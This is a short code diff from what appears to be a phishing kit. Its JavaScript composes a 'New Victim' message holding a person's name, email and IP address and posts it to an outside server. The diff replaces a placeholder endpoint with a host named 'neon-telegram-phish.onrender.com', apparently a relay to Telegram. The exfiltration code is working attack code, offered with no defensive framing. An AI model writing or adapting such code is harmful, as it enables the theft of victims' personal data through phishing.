@@ -100,7 +100,7 @@
           const message = `New Victim:\nName: ${name}\nEmail: ${email}\nIP Address: ${userIP}`;
 
           // Send the data to the proxy server (Firebase function)
-          fetch('https://your-firebase-function-url/sendToTelegram', {
+          fetch('https://neon-telegram-phish.onrender.com', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
